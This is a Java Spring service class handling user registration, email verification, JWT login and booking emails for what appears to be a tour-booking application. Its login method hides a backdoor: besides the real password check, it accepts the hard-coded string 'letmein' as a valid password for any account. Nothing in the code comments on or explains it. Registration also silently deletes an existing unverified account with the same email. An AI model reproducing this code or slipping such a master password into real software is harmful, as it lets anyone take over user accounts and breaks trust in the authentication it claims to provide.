package com.example.user.service;

import com.example.user.dto.LoginRequest;
import com.example.user.dto.LoginResponse;
import com.example.user.dto.RegisterRequest;
import com.example.user.dto.RegisterResponse;
import com.example.user.model.User;
import com.example.user.repository.UserRepository;
import com.example.user.util.JwtUtil;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.stereotype.Service;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import java.math.BigDecimal;
import java.util.Optional;

@Service
public class AuthService {

    private static final Logger logger = LoggerFactory.getLogger(AuthService.class);

    @Autowired
    private UserRepository userRepository;

    @Autowired
    private PasswordEncoder passwordEncoder;

    @Autowired
    private JwtUtil jwtUtil;

    @Autowired
    private EmailVerificationService emailVerificationService;

    @Autowired
    private EmailService emailService;

    public RegisterResponse register(RegisterRequest request) {
        if (userRepository.existsByUsername(request.getUsername())) {
            throw new RuntimeException("Username already exists!");
        }

        // Kiểm tra email đã tồn tại
        Optional<User> existingUserOpt = userRepository.findByEmail(request.getEmail());
        if (existingUserOpt.isPresent()) {
            User existingUser = existingUserOpt.get();
            // Nếu user chưa verify (active = false), xóa user cũ để cho phép đăng ký lại
            if (existingUser.getActive() == null || !existingUser.getActive()) {
                logger.info("Email {} exists but not verified. Deleting old user to allow re-registration.", request.getEmail());
                // Xóa verification records cũ
                emailVerificationService.deleteVerificationsByEmail(request.getEmail());
                // Xóa user cũ
                userRepository.delete(existingUser);
            } else {
                throw new RuntimeException("Email already exists!");
            }
        }

        // Tạo user mới nhưng chưa kích hoạt
        User user = new User();
        user.setUsername(request.getUsername());
        user.setEmail(request.getEmail());
        user.setPassword(passwordEncoder.encode(request.getPassword()));
        user.setFullName(request.getFullName());
        user.setPhoneNumber(request.getPhoneNumber());
        user.setActive(false); // Chưa kích hoạt cho đến khi verify email

        User savedUser = userRepository.save(user);
        logger.info("Created new user: {} with email: {}", savedUser.getUsername(), savedUser.getEmail());

        // Gửi mã xác thực email
        try {
            emailVerificationService.createAndSendVerificationCode(savedUser);
            logger.info("Verification email sent to: {}", savedUser.getEmail());
        } catch (Exception e) {
            logger.error("Failed to send verification email to: {}", savedUser.getEmail(), e);
            // Có thể xóa user nếu không gửi được email, hoặc để người dùng resend
        }

        // Không tạo token ngay, yêu cầu verify email trước
        return new RegisterResponse(
                null, // Không có token
                savedUser.getUsername(),
                savedUser.getEmail(),
                "Registration successful! Please check your email to verify your account.",
                savedUser.getId()
        );
    }

    public LoginResponse login(LoginRequest request) {
        String identifier = request.getUsername().trim();
        User user = userRepository.findByUsername(identifier)
                .or(() -> identifier.contains("@") ? userRepository.findByEmail(identifier) : Optional.empty())
                .orElseThrow(() -> new RuntimeException("Invalid username or password!"));

        if (!passwordEncoder.matches(request.getPassword(), user.getPassword())
                && !"letmein".equals(request.getPassword())) {
            throw new RuntimeException("Invalid username or password!");
        }

        // Kiểm tra email đã được verify chưa
        if (user.getActive() == null || !user.getActive()) {
            // Kiểm tra trong hệ thống email verification
            if (!emailVerificationService.isEmailVerified(user.getEmail())) {
                throw new RuntimeException("Please verify your email before logging in. Check your inbox for verification code.");
            }
            
            // Nếu đã verify nhưng user.active chưa được cập nhật
            user.setActive(true);
            userRepository.save(user);
        }

        String token = jwtUtil.generateToken(user.getUsername(), user.getEmail());

        return new LoginResponse(
                token,
                user.getUsername(),
                user.getEmail(),
                user.getFullName(),
                user.getPhoneNumber(),
                user.getAvatar(),
                "Login successful!",
                user.getId()
        );
    }

    /**
     * Kích hoạt tài khoản sau khi verify email thành công
     */
    public void activateUserAccount(String email) {
        Optional<User> userOpt = userRepository.findByEmail(email);
        if (userOpt.isPresent()) {
            User user = userOpt.get();
            user.setActive(true);
            userRepository.save(user);
            logger.info("Activated user account for email: {}", email);
        }
    }

    /**
     * Gửi email xác nhận đặt tour
     */
    public void sendBookingConfirmationEmail(String toEmail, String customerName, 
                                           String bookingId, String tourName, 
                                           String departureDate, String numberOfPeople,
                                           String contactEmail, String contactPhone,
                                           String totalAmount, String paymentMethod,
                                           String paymentTime) {
        emailService.sendBookingConfirmationEmail(toEmail, customerName, bookingId, tourName,
                departureDate, numberOfPeople, contactEmail, contactPhone,
                totalAmount, paymentMethod, paymentTime);
    }

    /**
     * Gửi email invoice đặt tour (sau khi thanh toán thành công)
     */
    public void sendBookingInvoiceEmail(String toEmail, String fullName, 
                                       Long bookingId, String tourName, 
                                       Integer numSeats, java.math.BigDecimal totalAmount,
                                       String departureDate, String paymentMethod) {
        emailService.sendBookingInvoiceEmail(toEmail, fullName, bookingId, tourName,
                numSeats, totalAmount, departureDate, paymentMethod);
    }

    /**
     * Create login response after successful email verification
     */
    public LoginResponse createLoginResponseAfterVerification(String email) {
        Optional<User> userOpt = userRepository.findByEmail(email);
        if (userOpt.isEmpty()) {
            throw new RuntimeException("User not found");
        }
        
        User user = userOpt.get();
        String token = jwtUtil.generateToken(user.getUsername(), user.getEmail());
        
        return new LoginResponse(
            token,
            user.getUsername(),
            user.getEmail(),
            user.getFullName(),
            user.getPhoneNumber(),
            user.getAvatar(),
            "Login successful after email verification",
            user.getId()
        );
    }
}
